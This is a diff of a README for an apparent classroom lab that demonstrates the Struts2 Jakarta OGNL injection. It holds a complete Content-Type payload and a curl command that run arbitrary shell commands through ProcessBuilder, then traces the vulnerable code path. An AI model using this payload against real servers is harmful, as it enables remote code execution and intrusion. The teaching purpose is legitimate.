@@ -2,10 +2,10 @@
 
 ## Instructions
 
-To simply run the webapp:
+To run the webapp:
 * java -jar ms-cybersecurity-1.jar (uses embedded Tomcat)
 * Java 1.8
-* the webapp boots on port 8080 by default (localhost:8080)
+* the webapp boots on port 8080 by default (http://localhost:8080/MSCybersecurity)
 
 If you want to modify this source, the project uses the Maven build system:
 * When modifying source: mvn package (create .jar)
@@ -21,7 +21,7 @@ OGNL uses expressions to perform tasks, and two of the expressions that are allo
 So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL 
  
     //  OGNL expression to instantiate Command obj
-    (#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd))
+    (#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity'))
   
 The edu.uvu.ms.cybersecurity.Command class
 
@@ -31,11 +31,14 @@ The edu.uvu.ms.cybersecurity.Command class
       
       public Command(Object cmd){
         this.cmd = cmd;
-        print();
       }
 
       private void print(){
           System.out.println("OGNL recieved cmd: "+this.cmd);
+      }
+      
+      public void print(String loc){
+          System.out.println("OGNL recieved cmd: "+this.cmd+" from "+loc);
       }
     }
      
@@ -46,8 +49,12 @@ The edu.uvu.ms.cybersecurity.Command class
 The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)
 
 
-    Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+    Content-Type:  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 
+
+Deliver the payload with CURL
+
+    curl -H "Content-Type:  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" -X POST http://localhost:8080/MSCybersecurity/exploit
 
 A portion of this payload was pulled from [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework/issues/8064)
 
@@ -61,26 +68,26 @@ The following is a step-by-step look at how this vulnerability is exploited.
 
 The Struts2 Dispatcher: org.apache.struts2.dispatcher.Dispatcher
 
-The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPartRequest.class parser method (matches on multipart/form-data in String)
+The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPart library and invokes the *MultiPartRequestWrapper()* constructor
 ![Dispatcher](src/main/resources/META-INF/resources/images/Dispatcher-wrapRequest.png)
 
-The OGNL expression from the Content-Header is then passed into the 'parse' method.
+he OGNL expression from the Content-Type header is then passed into the *parse()* method. Because the header information is bad, the parser will raise an exception and call the *buildErrorMessage()* method 
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/JakartaMultiPartRequest-parse.png)
 
-During the parsing attempt, an exception is thrown as it is unable to parse the OGNL expression, and ends up in JakartaMultiPartRequest.class buildError method
+The *buildErrorMessage()* method attempts to find an appropriate error message to return to the user, however, in order to do this, it has to uses the LocalizedTextUtil.class *findText()* method
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/JakartaMultiPartRequest-buildError.png)
 
-The buildError method attempts to find an appropriate error message to return to the user, however, in order to do this, it has to uses the LocalizedTextUtil.class findText method
+The LocalizedTextUtil.class findText method will in turn call *getDefaultMessage()* and pass in the Content-Type information 
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/LocalizedTextUtil-findText.png)
 
-The LocalizedTextUtil.class findText method will in turn call getDefaultMessage and pass in the Content-Header information
+The *getDefaultMessage()* message will then delegate to TextParseUtil.class *translateVariables()* method
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/LocalizedTextUtil-getDefaultMessage.png)
 
-The TextParseUtil.class translateVariables method delegates to the OgnlTextParser.class evaluate method
+The TextParseUtil.class *translateVariables()* method delegates to the OgnlTextParser.class evaluate method
 
 ![Dispatcher](src/main/resources/META-INF/resources/images/TextParseUtil-translateVariables.png)
 
